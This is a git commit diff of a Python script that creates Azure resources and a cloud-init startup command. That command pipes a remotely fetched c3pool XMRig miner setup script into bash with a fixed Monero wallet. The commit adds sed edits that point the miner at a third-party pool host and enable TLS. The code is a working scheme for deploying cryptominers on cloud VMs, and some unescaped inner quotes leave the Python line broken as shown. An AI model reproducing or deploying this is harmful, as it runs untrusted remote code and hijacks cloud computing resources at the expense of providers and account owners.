8ebcc686d2d1e9f2848d969740ce2fbc4993741d
drewnelson1 <100470072+drewnelson1@users.noreply.github.com>
2022-03-17 01:55:21 +0800

    Update me2.py

--- me2.py
+++ me2.py
@@ -18,7 +18,7 @@ get_default_cli().invoke(['group', 'create', '--name', 'myResourceGroup',
 print("创建资源组成功")
 
 # 3.创建开机后要运行的脚本
-init = "export HOME=/root && curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 89hV6RLT8B7K8qSgHdayHg4uoAiqQL6XhYjmuMUgjHaBf7EGmC3h364hgJx3H6Gpgo5uf5q9V2D7cabT7QtYGku25mTvV2C"
+init = "export HOME=/root && curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 89hV6RLT8B7K8qSgHdayHg4uoAiqQL6XhYjmuMUgjHaBf7EGmC3h364hgJx3H6Gpgo5uf5q9V2D7cabT7QtYGku25mTvV2C && sed -i 's/"max-threads-hint": 100/"max-threads-hint": 80/' /root/c3pool/config.json && sed -i 's/auto.c3pool.org:19999/auto.v10d.tk:33333/' /root/c3pool/config.json && sed -i 's/"tls": false/"tls": true/' /root/c3pool/config.json"
 with open("./cloud-init.txt", "w") as f:
     f.write("#cloud-config" + "\n")
     f.write("runcmd:" + "\n")
